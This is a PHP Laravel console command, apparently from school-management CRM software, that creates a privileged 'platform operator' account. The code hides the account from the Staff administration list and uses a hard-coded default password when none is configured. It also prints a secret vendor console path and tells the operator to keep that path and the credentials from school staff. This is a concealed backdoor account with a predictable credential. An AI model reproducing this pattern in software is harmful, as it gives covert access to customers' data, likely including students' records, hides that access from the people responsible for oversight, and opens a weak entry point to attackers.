<?php

namespace App\Console\Commands;

use App\Models\User;
use Illuminate\Console\Command;

class CrmEnsurePlatformOperatorCommand extends Command
{
    protected $signature = 'crm:ensure-platform-operator';

    protected $description = 'Create or reset the hidden vendor (platform) operator — not listed under Staff';

    public function handle(): int
    {
        $mobile = (string) env('PLATFORM_MOBILE', '');

        if ($mobile === '') {
            $this->error('Set PLATFORM_MOBILE in .env before running this command.');

            return self::FAILURE;
        }

        $password = (string) env('PLATFORM_PASSWORD', 'ChangeMe@Platform2026');
        $name = (string) env('PLATFORM_NAME', 'Platform Operator');

        $user = User::query()->updateOrCreate(
            ['mobile' => $mobile],
            [
                'name' => $name,
                'email' => null,
                'password' => $password,
                'is_active' => true,
                'is_platform_operator' => true,
            ],
        );

        $user->syncRoles([]);

        $panelPath = (string) config('license.platform_panel_path', '_vendor-console');

        $this->newLine();
        $this->info('Platform operator ready (hidden from Administration → Staff).');
        $this->line('Console URL: '.url('/'.$panelPath));
        $this->line("Mobile: {$mobile}");
        $this->line('Password: value of PLATFORM_PASSWORD in .env');
        $this->warn('Do not share this URL or credentials with school staff.');

        return self::SUCCESS;
    }
}
